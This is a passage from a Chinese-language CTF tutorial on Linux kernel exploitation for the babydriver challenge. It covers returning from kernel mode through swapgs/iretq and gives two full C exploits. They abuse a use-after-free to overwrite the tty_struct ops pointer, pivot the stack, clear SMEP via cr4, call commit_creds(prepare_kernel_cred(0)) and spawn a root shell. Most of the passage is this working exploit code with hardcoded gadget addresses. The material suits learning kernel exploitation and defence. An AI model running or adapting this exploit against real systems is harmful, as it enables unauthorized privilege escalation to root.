    /*
     * At this label, code paths which return to kernel and to user,
     * which come from interrupts/exception and from syscalls, merge.
     */
    GLOBAL(restore_regs_and_iret)
      RESTORE_EXTRA_REGS
    restore_c_regs_and_iret:
      RESTORE_C_REGS
      REMOVE_PT_GPREGS_FROM_STACK 8
      INTERRUPT_RETURN
根据上面的分析信息，我们不难推断出，若想从内核态返回至用户态，则需要依次完成以下两件事情：
  * 再执行一次 swapgs 指令，将当前的 GS 寄存器从 kernel gs 换回 user gs
  * 手动在栈上构造 iret 指令所需要的5个寄存器值，然后调用 iret 指令。
因此最终实现的部分代码如下：
    void get_shell() {
        printf("[+] got shell, welcome %s\n", (getuid() ? "user" : "root"));
        system("/bin/sh");
    }
    unsigned long user_cs, user_eflags, user_rsp, user_ss;
    void save_iret_data() {
        __asm__ __volatile__ ("mov %%cs, %0" : "=r" (user_cs));
        __asm__ __volatile__ ("pushf");
        __asm__ __volatile__ ("pop %0" : "=r" (user_eflags));
        __asm__ __volatile__ ("mov %%rsp, %0" : "=r" (user_rsp));
        __asm__ __volatile__ ("mov %%ss, %0" : "=r" (user_ss));
    }
    int main() {
        save_iret_data();
        printf(
            "[+] iret data saved.\n"
            "    user_cs: %ld\n"
            "    user_eflags: %ld\n"
            "    user_rsp: %p\n"
            "    user_ss: %ld\n",
            user_cs, user_eflags, (char*)user_rsp, user_ss
        );
        [...]
        u_int64_t* hijacked_stack_ptr = (u_int64_t*)hijacked_stack_addr;
        int idx = 0;
        hijacked_stack_ptr[idx++] = pop_rdi_addr;              // pop rdi; ret
        hijacked_stack_ptr[idx++] = 0x6f0;
        hijacked_stack_ptr[idx++] = mov_cr4_rdi_pop_rbp_addr;  // mov cr4, rdi; pop rbp; ret;
        hijacked_stack_ptr[idx++] = 0;                         // dummy
        hijacked_stack_ptr[idx++] = (u_int64_t)set_root_cred;
        // 新添加的 ROP 链
        hijacked_stack_ptr[idx++] = swapgs_pop_rbp_addr;
        hijacked_stack_ptr[idx++] = 0;                          // dummy
        hijacked_stack_ptr[idx++] = iretq_addr;
        hijacked_stack_ptr[idx++] = (u_int64_t)get_shell;       // iret_data.rip
        hijacked_stack_ptr[idx++] = user_cs;
        hijacked_stack_ptr[idx++] = user_eflags;
        hijacked_stack_ptr[idx++] = user_rsp;
        hijacked_stack_ptr[idx++] = user_ss;
        [...]
    }
######  4.4) ROP 注意点
在往常的用户层面的利用，我们无需关注 **缺页错误**
这样的一个无关紧要的异常。然而在内核利用中，缺页错误往往非常致命（不管是否是可恢复的，即正常的缺页错误也很致命），大概率会直接引发 **double
fault** ，致使内核重启：
因此在构造 ROP 链时，应尽量避免在内核中直接引用那些 **尚未装载页面的内存页** 。
再一个问题是单步调试。在调试内核 ROP
链时，有概率会在单步执行时直接跑炸内核，但先给该位置下断点后，再跑至该位置则执行正常。这个调试……仁者见仁智者见智吧（滑稽）
######  4.5) 完整 exploit
完整的 exploit 如下所示：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define xchg_eax_esp_addr           0xffffffff8100008a
    #define prepare_kernel_cred_addr    0xffffffff810a1810
    #define commit_creds_addr           0xffffffff810a1420
    #define pop_rdi_addr                0xffffffff810d238d
    #define mov_cr4_rdi_pop_rbp_addr    0xffffffff81004d80
    #define swapgs_pop_rbp_addr         0xffffffff81063694          
    #define iretq_addr                  0xffffffff814e35ef
    void set_root_cred(){
        void* (*prepare_kernel_cred)(void*) = (void* (*)(void*))prepare_kernel_cred_addr;
        void (*commit_creds)(void*) = (void (*)(void*))commit_creds_addr;
        void * root_cred = prepare_kernel_cred(NULL);
        commit_creds(root_cred);
    }
    void get_shell() {
        printf("[+] got shell, welcome %s\n", (getuid() ? "user" : "root"));
        system("/bin/sh");
    }
    unsigned long user_cs, user_eflags, user_rsp, user_ss;
    void save_iret_data() {
        __asm__ __volatile__ ("mov %%cs, %0" : "=r" (user_cs));
        __asm__ __volatile__ ("pushf");
        __asm__ __volatile__ ("pop %0" : "=r" (user_eflags));
        __asm__ __volatile__ ("mov %%rsp, %0" : "=r" (user_rsp));
        __asm__ __volatile__ ("mov %%ss, %0" : "=r" (user_ss));
    }
    int main() {
        save_iret_data();
        printf(
            "[+] iret data saved.\n"
            "    user_cs: %ld\n"
            "    user_eflags: %ld\n"
            "    user_rsp: %p\n"
            "    user_ss: %ld\n",
            user_cs, user_eflags, (char*)user_rsp, user_ss
        );
        int fd1 = open("/dev/babydev", O_RDWR);
        int fd2 = open("/dev/babydev", O_RDWR);
        ioctl(fd1, 65537, 0x2e0);
        close(fd1);
        // 申请 tty_struct
        int master_fd = open("/dev/ptmx", O_RDWR);
        // 构造一个 fake tty_operators
        u_int64_t fake_tty_ops[] = {
            0, 0, 0, 0, 0, 0, 0,
            xchg_eax_esp_addr, // int  (*write)(struct tty_struct*, const unsigned char *, int)
        };
        printf("[+] fake_tty_ops constructed\n");
        u_int64_t hijacked_stack_addr = ((u_int64_t)fake_tty_ops & 0xffffffff);
        printf("[+] hijacked_stack addr: %p\n", (char*)hijacked_stack_addr);
        char* fake_stack = NULL;
        if ((fake_stack = mmap(
                (char*)((hijacked_stack_addr & (~0xffff))),  // addr, 页对齐
                0x10000,                                     // length
                PROT_READ | PROT_WRITE,                     // prot
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,    // flags
                -1,                                         // fd
                0)                                          // offset
            ) == MAP_FAILED)  
            perror("mmap");
        printf("[+]     fake_stack addr: %p\n", fake_stack);
        u_int64_t* hijacked_stack_ptr = (u_int64_t*)hijacked_stack_addr;
        int idx = 0;
        hijacked_stack_ptr[idx++] = pop_rdi_addr;              // pop rdi; ret
        hijacked_stack_ptr[idx++] = 0x6f0;
        hijacked_stack_ptr[idx++] = mov_cr4_rdi_pop_rbp_addr;  // mov cr4, rdi; pop rbp; ret;
        hijacked_stack_ptr[idx++] = 0;                         // dummy
        hijacked_stack_ptr[idx++] = (u_int64_t)set_root_cred;
        hijacked_stack_ptr[idx++] = swapgs_pop_rbp_addr;
        hijacked_stack_ptr[idx++] = 0;                          // dummy
        hijacked_stack_ptr[idx++] = iretq_addr;
        hijacked_stack_ptr[idx++] = (u_int64_t)get_shell;       // iret_data.rip
        hijacked_stack_ptr[idx++] = user_cs;
        hijacked_stack_ptr[idx++] = user_eflags;
        hijacked_stack_ptr[idx++] = user_rsp;
        hijacked_stack_ptr[idx++] = user_ss;
        printf("[+] privilege escape ROP prepared\n");
        // 读取 tty_struct 结构体的所有数据
        int ops_ptr_offset = 4 + 4 + 8 + 8;
        char overwrite_mem[ops_ptr_offset + 8];
        char** ops_ptr_addr = (char**)(overwrite_mem + ops_ptr_offset);
        read(fd2, overwrite_mem, sizeof(overwrite_mem));
        printf("[+] origin ops ptr addr: %p\n", *ops_ptr_addr);
        // 修改并覆写 tty_struct 结构体
        *ops_ptr_addr = (char*)fake_tty_ops;
        write(fd2, overwrite_mem, sizeof(overwrite_mem));
        printf("[+] hacked ops ptr addr: %p\n", *ops_ptr_addr);
        // 触发 tty_write
        // 注意使用 write 时， buf 指针必须有效，否则会提前返回 EFAULT
        int buf[] = {0};
        write(master_fd, buf, 8);
        return 0;
    }
运行效果：
下面是一个简化版的 exploit:
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define xchg_eax_esp_addr           0xffffffff8100008a
    #define prepare_kernel_cred_addr    0xffffffff810a1810
    #define commit_creds_addr           0xffffffff810a1420
    #define pop_rdi_addr                0xffffffff810d238d
    #define mov_cr4_rdi_pop_rbp_addr    0xffffffff81004d80
    #define swapgs_pop_rbp_addr         0xffffffff81063694          
    #define iretq_addr                  0xffffffff814e35ef
    void set_root_cred(){
        void* (*prepare_kernel_cred)(void*) = prepare_kernel_cred_addr;
        void (*commit_creds)(void*) = commit_creds_addr;
        commit_creds(prepare_kernel_cred(NULL));
    }
    void get_shell() {
        system("/bin/sh");
    }
    unsigned long user_cs, user_eflags, user_rsp, user_ss;
    void save_iret_data() {
        __asm__ __volatile__ ("mov %%cs, %0" : "=r" (user_cs));
        __asm__ __volatile__ ("pushf");
        __asm__ __volatile__ ("pop %0" : "=r" (user_eflags));
        __asm__ __volatile__ ("mov %%rsp, %0" : "=r" (user_rsp));
        __asm__ __volatile__ ("mov %%ss, %0" : "=r" (user_ss));
    }
    int main() {
        save_iret_data();
        int fd1 = open("/dev/babydev", O_RDWR);
        int fd2 = open("/dev/babydev", O_RDWR);
        ioctl(fd1, 65537, 0x2e0);
        close(fd1);
        int master_fd = open("/dev/ptmx", O_RDWR);
        u_int64_t fake_tty_ops[] = {
            0, 0, 0, 0, 0, 0, 0,
            xchg_eax_esp_addr
        };
        u_int64_t hijacked_stack_addr = ((u_int64_t)fake_tty_ops & 0xffffffff);
        char* fake_stack = mmap(
                (hijacked_stack_addr & (~0xffff)),
                0x10000,
                PROT_READ | PROT_WRITE,                    
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                -1,
                0);
        u_int64_t rop_chain_mem[] = {
            pop_rdi_addr, 0x6f0, 
            mov_cr4_rdi_pop_rbp_addr, 0, set_root_cred,
            swapgs_pop_rbp_addr, 0, 
            iretq_addr, get_shell, user_cs, user_eflags, user_rsp, user_ss
        };
        memcpy(hijacked_stack_addr, rop_chain_mem, sizeof(rop_chain_mem));
        int ops_ptr_offset = 4 + 4 + 8 + 8;
        char overwrite_mem[ops_ptr_offset + 8];
        char** ops_ptr_addr = overwrite_mem + ops_ptr_offset;
        read(fd2, overwrite_mem, sizeof(overwrite_mem));
        *ops_ptr_addr = fake_tty_ops;
        write(fd2, overwrite_mem, sizeof(overwrite_mem));
        int buf[] = {0};
        write(master_fd, buf, 8);
        return 0;
    }
## 五、参考
  * [CTF Wiki – Linux Platform Kernel Mode](https://wiki.x10sec.org/pwn/linux/kernel-mode/environment/readme/)
  * [How to use KGDB – LinuxLink](https://linuxlink.timesys.com/docs/how_to_use_kgdb)
  * [kernelexp学习笔记](https://d1nn3r.github.io/2019/07/27/kernelexp/)
  * [【Writeup】CISCN2017_Pwn_babydriver – CSDN](https://blog.csdn.net/m0_38100569/article/details/100673103)
  * _[Linux Device Drivers, Third Edition – Chapter 3 Char Drivers](https://lwn.net/Kernel/LDD3/)_
  * [Linux下使用class_create,device_create自动创建设备文件结点](https://blog.csdn.net/tq384998430/article/details/54342044)
  * [Linux下tty/pty/pts/ptmx详解](https://www.cnblogs.com/bittorrent/p/3789193.html)
  * [Linux终端简介与pty编程](https://www.cnblogs.com/dux2016/articles/6236131.html)
  * Linux manual page